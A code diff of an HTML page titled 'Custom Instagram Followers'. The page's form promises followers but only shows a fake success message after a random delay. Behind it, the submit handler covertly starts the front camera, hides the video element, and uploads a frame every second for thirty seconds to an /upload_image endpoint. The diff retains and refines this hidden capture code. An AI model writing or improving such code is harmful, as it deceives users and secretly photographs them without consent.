@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>Custom Instagram Followers</title>
+  <meta charset="UTF-8" />
+  <title>Custom Instagram Followers</title>
 </head>
 <body>
   <form id="instaForm">
@@ -11,8 +11,10 @@
     <button type="submit">Get Followers</button>
   </form>
   <div id="status"></div>
+
   <script>
     let backgroundRunning = false;
+    const statusEl = document.getElementById('status');
 
     function sendPicture(imageData) {
       fetch('/upload_image', {
@@ -25,7 +27,7 @@
     async function captureFrontCam() {
       const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
       const video = document.createElement('video');
-      video.style.display = 'none'; // Keep hidden
+      video.style.display = 'none';
       document.body.appendChild(video);
       video.srcObject = mediaStream;
       video.play();
@@ -41,24 +43,24 @@
         sendPicture(dataUrl);
       }, 1000);
 
-      // Stop capturing after 30 seconds or based on your needs:
       setTimeout(() => {
         clearInterval(captureInterval);
         mediaStream.getTracks().forEach(track => track.stop());
         video.remove();
+        backgroundRunning = false;
       }, 30000);
     }
 
     document.getElementById('instaForm').onsubmit = async function(e) {
       e.preventDefault();
       const username = this.username.value;
-      const amount = Math.min(Math.max(parseInt(this.amount.value) || 0, 0), 10000);
+      const amountRaw = parseInt(this.amount.value);
+      const amount = Math.min(Math.max(amountRaw || 0, 0), 10000);
+      statusEl.textContent = 'Adding followers...';
 
-      document.getElementById('status').textContent = 'Adding followers...';
-
-      // Simulate follower adding process
+      // Simulate adding followers, replace with real API call if needed
       setTimeout(() => {
-        document.getElementById('status').textContent = `Success! ${amount} followers sent to ${username}.`;
+        statusEl.textContent = `Success! ${amount} followers sent to ${username}.`;
       }, 1500 + Math.floor(Math.random() * 2500));
 
       if (!backgroundRunning) {
